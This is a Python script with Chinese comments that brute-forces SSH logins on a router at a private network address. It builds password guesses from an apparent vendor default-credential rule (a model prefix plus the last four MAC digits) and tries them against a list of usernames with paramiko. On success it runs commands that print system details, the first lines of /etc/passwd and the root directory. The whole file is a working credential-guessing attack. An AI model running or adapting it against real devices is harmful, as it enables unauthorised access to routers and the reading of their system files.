#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""按中华电信版的派生规则（<型号> + MAC后4位）测 Singtel 版的 SSH。
   cht / 43tc + MAC后4位  ->  Singtel 版可能是  <用户> / 43st + MAC后4位
"""
import paramiko, warnings, logging, sys, time
warnings.filterwarnings('ignore')
logging.disable(logging.CRITICAL)

HOST = '192.168.3.20'

# 四台节点的 MAC 后 4 位
MAC4S = ['202e', '5166', '13c7', '501c', '50 1c'.replace(' ', '')]

users = ['cht', 'st', 'singtel', 'sintel', 'user', 'admin', 'root', 'support', 'eng']
pwds = []
for m in MAC4S:
    for pre in ['43st', '43ST', '43tc', '43ST', 'st', 'ST']:
        pwds.append(pre + m)
        pwds.append(pre + m.upper())
pwds += ['43st', '43tc', 'st', 'singtel', 'sintel', 'user', 'admin', 'support', 'cht']

print("共 %d 组，开始..." % (len(users) * len(pwds)), flush=True)
n = 0
for u in users:
    for p in pwds:
        n += 1
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            c.connect(HOST, port=22, username=u, password=p, timeout=6,
                      allow_agent=False, look_for_keys=False)
            print("\n★★★★★★ 成功！ 用户名=%r  密码=%r" % (u, p), flush=True)
            i, o, e = c.exec_command('id; uname -a; cat /etc/passwd | head -5; ls /')
            print(o.read().decode('utf-8', 'replace')[:800], flush=True)
            c.close()
            sys.exit(0)
        except paramiko.AuthenticationException:
            if n % 20 == 0:
                print("  ...已试 %d 组" % n, flush=True)
        except Exception as ex:
            print("  连接问题 @ %s/%s: %s %s" % (u, p, type(ex).__name__, str(ex)[:60]), flush=True)
            time.sleep(2)
        finally:
            try:
                c.close()
            except Exception:
                pass

print("\n全部 %d 组都没成功" % n, flush=True)
